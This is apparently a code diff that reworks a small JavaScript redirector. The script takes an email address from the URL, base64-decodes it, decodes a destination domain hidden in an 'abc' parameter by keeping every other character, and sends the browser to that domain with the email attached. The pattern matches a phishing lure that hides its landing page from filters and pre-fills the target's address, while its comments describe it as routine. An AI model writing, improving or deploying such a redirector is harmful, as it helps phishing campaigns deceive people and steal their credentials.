@@ -1,4 +1,5 @@
 <script>
+
 // Get the current URL
 var currentUrl = window.location.href;
 
@@ -7,47 +8,49 @@ function decodeBase64(encodedString) {
     return atob(encodedString);
 }
 
-// Function to decode obfuscated 'abc' domain (remove 1 char, skip 1, repeat)
-function decodeABC(input) {
+// Function to clean the abc value (remove every other character)
+function decodeAbcPattern(str) {
     let result = '';
-    for (let i = 1; i < input.length; i += 2) {
-        result += input[i];
+    for (let i = 1; i < str.length; i += 2) {
+        result += str[i];
     }
     return result;
 }
 
-// Extract the email address from the URL
+// Extract the email address from the URL using a regular expression
 var emailMatch = currentUrl.match(/[?&#]([^=]*)=([^&]*)/) || currentUrl.match(/#([^=]*)=([^&]*)/);
 
 if (emailMatch) {
     var key = emailMatch[1];
     var value = emailMatch[2];
 
-    // Try to decode the email if base64
+    // Check if the value is base64 encoded
     var decodedEmail = value;
     try {
         decodedEmail = decodeBase64(value);
     } catch (e) {
-        // Use raw value if not valid base64
+        // Not base64 encoded, use the original value
     }
 
-    // Extract and decode abc= value
+    // ✅ Extract and decode abc= domain
     var abcMatch = currentUrl.match(/[?&#]abc=([^&]*)/);
-    var baseUrl = 'https://goal.com'; // default if abc not present
+    var baseUrl = 'https://goal.com'; // default fallback
     if (abcMatch) {
-        var obfuscated = abcMatch[1];
-        var decodedDomain = decodeABC(obfuscated);
-        // Ensure it has https prefix
-        if (!decodedDomain.startsWith('http')) {
+        var encodedDomain = abcMatch[1];
+        var decodedDomain = decodeAbcPattern(encodedDomain);
+
+        // Prepend https:// if not present
+        if (!decodedDomain.startsWith('http://') && !decodedDomain.startsWith('https://')) {
             decodedDomain = 'https://' + decodedDomain;
         }
+
         baseUrl = decodedDomain;
     }
 
-    // Redirect to final URL
     var redirectUrl = baseUrl + '#' + decodedEmail;
     window.location.href = redirectUrl;
 } else {
     console.log('Email address not found');
 }
+
 </script>
